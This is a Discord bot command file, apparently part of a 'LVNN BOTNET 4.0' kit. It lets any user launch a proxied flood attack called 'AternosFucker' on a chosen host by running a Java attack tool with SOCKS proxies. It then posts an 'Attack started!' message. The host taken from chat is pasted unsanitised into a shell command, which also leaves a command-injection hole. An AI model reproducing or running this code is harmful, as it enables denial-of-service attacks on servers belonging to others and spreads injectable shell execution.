const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 5 java -jar 2.jar ${host} 3 10000 1 socks_proxies.txt 4`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **LVNN BOTNET 4.0** 🔥')
	.setTimestamp()
	.setDescription("**► Method: AternosFucker 💥** \n \n ► Attack started! ✅ \n ► for 5 seconds! 🕒 \n ☆ Flood by BlackCrack SQUAD ☆")
	.setFooter('© Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['aternosfucker'],
  permLevel: 0
}

exports.help = {
  name: 'aternosfucker',
  description: 'Özel',
  usage: 'aternosfucker'
}